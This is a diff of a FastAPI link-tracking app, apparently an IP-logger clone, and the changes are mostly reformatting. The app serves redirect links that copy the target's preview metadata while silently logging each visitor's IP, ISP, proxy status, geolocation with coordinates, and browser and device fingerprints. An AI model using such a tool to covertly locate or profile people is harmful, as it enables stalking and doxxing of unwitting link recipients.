@@ -13,24 +13,24 @@ import os
 
 import httpx
 from bs4 import BeautifulSoup
-from user_agents import parse as ua_parse  # pip install pyyaml ua-parser user‑agents
+from user_agents import parse as ua_parse  # pip install pyyaml ua-parser user-agents
 
 # Environment config
-BITLY_TOKEN = os.getenv("BITLY_TOKEN")  # Set this in your environment for Bitly integration
+BITLY_TOKEN = os.getenv("BITLY_TOKEN")
 
 app = FastAPI()
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 
 DB_PATH = "links.db"
-SERVICE_URL = "https://q3os.onrender.com/"  # ← your deployed URL
+SERVICE_URL = "https://q3os.onrender.com/"
 
 
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
 
-    # ─── links table ──────────────────────────────────────────────────────────
+    # links table
     c.execute("""
     CREATE TABLE IF NOT EXISTS links (
       id INTEGER PRIMARY KEY,
@@ -40,46 +40,40 @@ def init_db():
       og_title TEXT,
       og_description TEXT,
       og_image TEXT,
-
-      #── server-side capture flags ─────────────────────────────────
-      capture_ip           INTEGER DEFAULT 0,
-      capture_host         INTEGER DEFAULT 0,
-      capture_provider     INTEGER DEFAULT 0,
-      capture_proxy        INTEGER DEFAULT 0,
-      capture_continent    INTEGER DEFAULT 0,
-      capture_country      INTEGER DEFAULT 0,
-      capture_region       INTEGER DEFAULT 0,
-      capture_city         INTEGER DEFAULT 0,
-      capture_latlong      INTEGER DEFAULT 0,
-
-      capture_browser      INTEGER DEFAULT 0,
-      capture_os           INTEGER DEFAULT 0,
-      
-      #── client-side capture flags ─────────────────────────────────
-      capture_user_agent     INTEGER DEFAULT 0,
-      capture_language       INTEGER DEFAULT 0,
-      capture_platform       INTEGER DEFAULT 0,
-      capture_cookies        INTEGER DEFAULT 0,
-      capture_screen_width   INTEGER DEFAULT 0,
-      capture_screen_height  INTEGER DEFAULT 0,
+      capture_ip INTEGER DEFAULT 0,
+      capture_host INTEGER DEFAULT 0,
+      capture_provider INTEGER DEFAULT 0,
+      capture_proxy INTEGER DEFAULT 0,
+      capture_continent INTEGER DEFAULT 0,
+      capture_country INTEGER DEFAULT 0,
+      capture_region INTEGER DEFAULT 0,
+      capture_city INTEGER DEFAULT 0,
+      capture_latlong INTEGER DEFAULT 0,
+      capture_browser INTEGER DEFAULT 0,
+      capture_os INTEGER DEFAULT 0,
+      capture_user_agent INTEGER DEFAULT 0,
+      capture_language INTEGER DEFAULT 0,
+      capture_platform INTEGER DEFAULT 0,
+      capture_cookies INTEGER DEFAULT 0,
+      capture_screen_width INTEGER DEFAULT 0,
+      capture_screen_height INTEGER DEFAULT 0,
       capture_viewport_width INTEGER DEFAULT 0,
       capture_viewport_height INTEGER DEFAULT 0,
-      capture_color_depth    INTEGER DEFAULT 0,
-      capture_device_memory  INTEGER DEFAULT 0,
+      capture_color_depth INTEGER DEFAULT 0,
+      capture_device_memory INTEGER DEFAULT 0,
       capture_hardware_concurrency INTEGER DEFAULT 0,
-      capture_connection     INTEGER DEFAULT 0,
-      capture_battery        INTEGER DEFAULT 0,
-      capture_timezone       INTEGER DEFAULT 0,
-      capture_local_time     INTEGER DEFAULT 0,
-      capture_referrer       INTEGER DEFAULT 0
+      capture_connection INTEGER DEFAULT 0,
+      capture_battery INTEGER DEFAULT 0,
+      capture_timezone INTEGER DEFAULT 0,
+      capture_local_time INTEGER DEFAULT 0,
+      capture_referrer INTEGER DEFAULT 0
     )""")
 
-    # ─── visits table ────────────────────────────────────────────────────────
+    # visits table
     c.execute("""
     CREATE TABLE IF NOT EXISTS visits (
       id INTEGER PRIMARY KEY,
       link_id INTEGER,
-      # server-side
       ip TEXT,
       host TEXT,
       provider TEXT,
@@ -91,7 +85,6 @@ def init_db():
       latlong TEXT,
       browser TEXT,
       os TEXT,
-      # client-side
       user_agent TEXT,
       language TEXT,
       platform TEXT,
@@ -126,12 +119,12 @@ def generate_code(length: int = 6) -> str:
     return ''.join(random.choices(alphabet, k=length))
 
 
-# ─── External URL Shortener Helpers ─────────────────────────────────────
 async def shorten_with_tinyurl(url: str) -> str:
     api_url = f"http://tinyurl.com/api-create.php?url={url}"
     async with httpx.AsyncClient(timeout=5.0) as client:
         resp = await client.get(api_url)
         return resp.text if resp.status_code == 200 else url
+
 
 async def shorten_with_bitly(url: str) -> str:
     if not BITLY_TOKEN:
@@ -141,8 +134,7 @@ async def shorten_with_bitly(url: str) -> str:
     async with httpx.AsyncClient(timeout=5.0) as client:
         resp = await client.post("https://api-ssl.bitly.com/v4/shorten", json=payload, headers=headers)
         if resp.status_code == 200:
-            data = resp.json()
-            return data.get("link", url)
+            return resp.json().get("link", url)
         return url
 
 
@@ -156,39 +148,34 @@ async def create_link(
     request: Request,
     target_url: str = Form(...),
     shortener: str  = Form(...),
-
-    # server capture flags
-    capture_ip: str        = Form(None),
-    capture_host: str      = Form(None),
-    capture_provider: str  = Form(None),
-    capture_proxy: str     = Form(None),
+    capture_ip: str = Form(None),
+    capture_host: str = Form(None),
+    capture_provider: str = Form(None),
+    capture_proxy: str = Form(None),
     capture_continent: str = Form(None),
-    capture_country: str   = Form(None),
-    capture_region: str    = Form(None),
-    capture_city: str      = Form(None),
-    capture_latlong: str   = Form(None),
-    capture_browser: str   = Form(None),
-    capture_os: str        = Form(None),
-
-    # client capture flags
-    capture_user_agent: str      = Form(None),
-    capture_language: str        = Form(None),
-    capture_platform: str        = Form(None),
-    capture_cookies: str         = Form(None),
-    capture_screen_width: str    = Form(None),
-    capture_screen_height: str   = Form(None),
-    capture_viewport_width: str  = Form(None),
+    capture_country: str = Form(None),
+    capture_region: str = Form(None),
+    capture_city: str = Form(None),
+    capture_latlong: str = Form(None),
+    capture_browser: str = Form(None),
+    capture_os: str = Form(None),
+    capture_user_agent: str = Form(None),
+    capture_language: str = Form(None),
+    capture_platform: str = Form(None),
+    capture_cookies: str = Form(None),
+    capture_screen_width: str = Form(None),
+    capture_screen_height: str = Form(None),
+    capture_viewport_width: str = Form(None),
     capture_viewport_height: str = Form(None),
-    capture_color_depth: str     = Form(None),
-    capture_device_memory: str   = Form(None),
+    capture_color_depth: str = Form(None),
+    capture_device_memory: str = Form(None),
     capture_hardware_concurrency: str = Form(None),
-    capture_connection: str      = Form(None),
-    capture_battery: str         = Form(None),
-    capture_timezone: str        = Form(None),
-    capture_local_time: str      = Form(None),
-    capture_referrer: str        = Form(None),
+    capture_connection: str = Form(None),
+    capture_battery: str = Form(None),
+    capture_timezone: str = Form(None),
+    capture_local_time: str = Form(None),
+    capture_referrer: str = Form(None),
 ):
-    # 1) generate code
     if shortener == "random":
         code = generate_code()
     elif shortener in ("tinyurl", "bitly"):
@@ -196,7 +183,6 @@ async def create_link(
     else:
         code = shortener
 
-    # 2) scrape Open Graph metadata
     og_title = og_description = og_image = ""
     try:
         async with httpx.AsyncClient(timeout=5.0) as client:
@@ -211,45 +197,43 @@ async def create_link(
     except Exception:
         pass
 
-    # 3) collect flags dict
-    flags = { key: bool(val) for key,val in {
-      'capture_ip': capture_ip,
-      'capture_host': capture_host,
-      'capture_provider': capture_provider,
-      'capture_proxy': capture_proxy,
-      'capture_continent': capture_continent,
-      'capture_country': capture_country,
-      'capture_region': capture_region,
-      'capture_city': capture_city,
-      'capture_latlong': capture_latlong,
-      'capture_browser': capture_browser,
-      'capture_os': capture_os,
-      'capture_user_agent': capture_user_agent,
-      'capture_language': capture_language,
-      'capture_platform': capture_platform,
-      'capture_cookies': capture_cookies,
-      'capture_screen_width': capture_screen_width,
-      'capture_screen_height': capture_screen_height,
-      'capture_viewport_width': capture_viewport_width,
-      'capture_viewport_height': capture_viewport_height,
-      'capture_color_depth': capture_color_depth,
-      'capture_device_memory': capture_device_memory,
-      'capture_hardware_concurrency': capture_hardware_concurrency,
-      'capture_connection': capture_connection,
-      'capture_battery': capture_battery,
-      'capture_timezone': capture_timezone,
-      'capture_local_time': capture_local_time,
-      'capture_referrer': capture_referrer
-    }.items() }
+    flags = {k: bool(v) for k, v in {
+        'capture_ip': capture_ip,
+        'capture_host': capture_host,
+        'capture_provider': capture_provider,
+        'capture_proxy': capture_proxy,
+        'capture_continent': capture_continent,
+        'capture_country': capture_country,
+        'capture_region': capture_region,
+        'capture_city': capture_city,
+        'capture_latlong': capture_latlong,
+        'capture_browser': capture_browser,
+        'capture_os': capture_os,
+        'capture_user_agent': capture_user_agent,
+        'capture_language': capture_language,
+        'capture_platform': capture_platform,
+        'capture_cookies': capture_cookies,
+        'capture_screen_width': capture_screen_width,
+        'capture_screen_height': capture_screen_height,
+        'capture_viewport_width': capture_viewport_width,
+        'capture_viewport_height': capture_viewport_height,
+        'capture_color_depth': capture_color_depth,
+        'capture_device_memory': capture_device_memory,
+        'capture_hardware_concurrency': capture_hardware_concurrency,
+        'capture_connection': capture_connection,
+        'capture_battery': capture_battery,
+        'capture_timezone': capture_timezone,
+        'capture_local_time': capture_local_time,
+        'capture_referrer': capture_referrer
+    }.items()}
 
-    # 4) insert link + flags
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     created_at = datetime.utcnow().isoformat()
 
-    cols         = ", ".join(flags.keys())
+    cols = ", ".join(flags.keys())
     placeholders = ", ".join("?" for _ in flags)
-    vals         = [int(v) for v in flags.values()]
+    vals = [int(v) for v in flags.values()]
 
     try:
         c.execute(f"""
@@ -259,7 +243,6 @@ async def create_link(
             (?, ?, ?, ?, ?, ?, {placeholders})
         """, [code, target_url, created_at, og_title, og_description, og_image, *vals])
     except sqlite3.IntegrityError:
-        # collision; regenerate
         code = generate_code()
         c.execute(f"""
           INSERT INTO links
@@ -271,11 +254,9 @@ async def create_link(
     conn.commit()
     conn.close()
 
-    # 5) build URLs
     link_url  = request.url_for("redirect_to_target", code=code)
-    track_url = request.url_for("track",            code=code)
+    track_url = request.url_for("track", code=code)
 
-    # 6) optional shortener
     if shortener == "tinyurl":
         short_url = await shorten_with_tinyurl(link_url)
     elif shortener == "bitly":
@@ -283,10 +264,12 @@ async def create_link(
     else:
         short_url = link_url
 
-    return templates.TemplateResponse(
-      "result.html",
-      {"request": request, "link_url": link_url, "track_url": track_url, "short_url": short_url}
-    )
+    return templates.TemplateResponse("result.html", {
+        "request": request,
+        "link_url": link_url,
+        "track_url": track_url,
+        "short_url": short_url
+    })
 
 
 @app.get("/{code}", response_class=HTMLResponse)
@@ -327,7 +310,6 @@ async def redirect_to_target(
       cap_tz, cap_lt, cap_referrer
     ) = row
 
-    # ─── server-side captures ───────────────────────────────────────────────
     if x_real_ip:
         ip = x_real_ip.strip()
     elif x_forwarded_for:
@@ -346,8 +328,10 @@ async def redirect_to_target(
             host = ""
 
     country = region = city = continent = provider = proxy = latlong = ""
-    need_geo = any([cap_provider, cap_proxy, cap_continent,
-                    cap_country, cap_region, cap_city, cap_latlong])
+    need_geo = any([
+        cap_provider, cap_proxy, cap_continent,
+        cap_country, cap_region, cap_city, cap_latlong
+    ])
     if need_geo and ip:
         async with httpx.AsyncClient(timeout=5.0) as client:
             try:
@@ -361,35 +345,32 @@ async def redirect_to_target(
                   "?fields=status,message,country,regionName,city,continent,org,proxy,lat,lon"
                 )
                 data = r2.json() if r2.status_code == 200 else {}
-            if cap_provider:   provider  = data.get("org","") or ""
-            if cap_proxy:      proxy     = str(data.get("proxy","")) or ""
-            if cap_continent:  continent = data.get("continent","") or ""
-            if cap_country:    country   = data.get("country_name","") or data.get("country","") or ""
-            if cap_region:     region    = data.get("region","") or data.get("regionName","") or ""
-            if cap_city:       city      = data.get("city","") or ""
+            if cap_provider:
+                provider  = data.get("org","") or ""
+            if cap_proxy:
+                proxy     = str(data.get("proxy","")) or ""
+            if cap_continent:
+                continent = data.get("continent","") or ""
+            if cap_country:
+                country   = data.get("country_name","") or data.get("country","") or ""
+            if cap_region:
+                region    = data.get("region","") or data.get("regionName","") or ""
+            if cap_city:
+                city      = data.get("city","") or ""
             if cap_latlong:
                 lat = data.get("latitude") or data.get("lat")
                 lon = data.get("longitude") or data.get("lon")
                 latlong = f"{lat},{lon}" if lat and lon else ""
 
     cookies_enabled = 1 if cap_cookies and "cookie" in request.headers else 0
-
-    browser = ""
-    if cap_browser:
-        browser = f"{ua.browser.family} {'.'.join(str(x) for x in ua.browser.version)}".strip()
-
-    os_str = ""
-    if cap_os:
-        os_str = f"{ua.os.family} {'.'.join(str(x) for x in ua.os.version)}".strip()
-
+    browser = f"{ua.browser.family} {'.'.join(str(x) for x in ua.browser.version)}".strip() if cap_browser else ""
+    os_str  = f"{ua.os.family} {'.'.join(str(x) for x in ua.os.version)}".strip() if cap_os else ""
     timestamp = datetime.utcnow().isoformat()
 
-    # ─── insert partial visit record; JS will POST the rest ───────────────
     c.execute("""
       INSERT INTO visits
         (link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
-         browser, os,
-         timestamp)
+         browser, os, timestamp)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
     """, (
       link_id, ip, host, provider, proxy, continent, country, region, city, latlong,
@@ -398,7 +379,6 @@ async def redirect_to_target(
     conn.commit()
     conn.close()
 
-    # render redirect page + client‑side JS
     return templates.TemplateResponse("redirect.html", {
       "request": request,
       "target": target,
@@ -406,13 +386,12 @@ async def redirect_to_target(
       "og_description": og_description,
       "og_image": og_image,
       "code": code,
-      # which flags to send on JS payload:
       "flags": {
-        "ua": cap_ua, "lang":cap_lang, "platform":cap_platform,
-        "cookies":cap_cookies, "sw":cap_sw, "sh":cap_sh,
-        "vw":cap_vw, "vh":cap_vh, "cd":cap_cd,
-        "dm":cap_dm, "hc":cap_hc, "conn":cap_conn,
-        "batt":cap_batt, "tz":cap_tz, "lt":cap_lt, "ref":cap_referrer
+        "ua": cap_ua, "lang": cap_lang, "platform": cap_platform,
+        "cookies": cap_cookies, "sw": cap_sw, "sh": cap_sh,
+        "vw": cap_vw, "vh": cap_vh, "cd": cap_cd,
+        "dm": cap_dm, "hc": cap_hc, "conn": cap_conn,
+        "batt": cap_batt, "tz": cap_tz, "lt": cap_lt, "ref": cap_referrer
       }
     })
 
@@ -427,13 +406,11 @@ async def collect_data(request: Request):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
 
-    # find latest visit
     c.execute("SELECT MAX(id) FROM visits WHERE link_id=(SELECT id FROM links WHERE code=?)", (code,))
     visit_id = c.fetchone()[0]
 
     updates = []
     params = []
-    # allowed client‑side fields
     allowed = [
       "user_agent","language","platform","cookies_enabled","screen_width","screen_height",
       "viewport_width","viewport_height","color_depth","device_memory","hardware_concurrency",
@@ -457,7 +434,6 @@ async def collect_data(request: Request):
 async def track(request: Request, code: str):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-
     c.execute("SELECT id FROM links WHERE code=?", (code,))
     row = c.fetchone()
     if not row:
